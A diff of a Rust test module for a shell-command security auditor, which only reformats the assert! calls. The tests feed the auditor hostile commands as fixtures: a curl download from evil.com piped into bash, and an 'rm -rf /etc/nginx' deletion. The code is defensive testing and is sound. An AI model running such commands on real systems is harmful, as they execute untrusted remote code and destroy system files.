@@ -401,18 +401,22 @@ mod tests {
     fn detect_download_pipe_to_shell() {
         let parsed = parse_shell("curl https://evil.com/script.sh | bash").unwrap();
         let warnings = audit_shell(&parsed);
-        assert!(warnings
-            .iter()
-            .any(|w| matches!(w, SecurityWarning::PipeDownloadToShell)));
+        assert!(
+            warnings
+                .iter()
+                .any(|w| matches!(w, SecurityWarning::PipeDownloadToShell))
+        );
     }
 
     #[test]
     fn detect_dangerous_rm() {
         let parsed = parse_shell("rm -rf /etc/nginx").unwrap();
         let warnings = audit_shell(&parsed);
-        assert!(warnings
-            .iter()
-            .any(|w| matches!(w, SecurityWarning::DangerousRm)));
+        assert!(
+            warnings
+                .iter()
+                .any(|w| matches!(w, SecurityWarning::DangerousRm))
+        );
     }
 
     #[test]
@@ -441,8 +445,10 @@ mod tests {
     fn detect_sudo_execution() {
         let parsed = parse_shell("sudo apt update").unwrap();
         let warnings = audit_shell(&parsed);
-        assert!(warnings
-            .iter()
-            .any(|w| matches!(w, SecurityWarning::SudoExecution)));
+        assert!(
+            warnings
+                .iter()
+                .any(|w| matches!(w, SecurityWarning::SudoExecution))
+        );
     }
 }
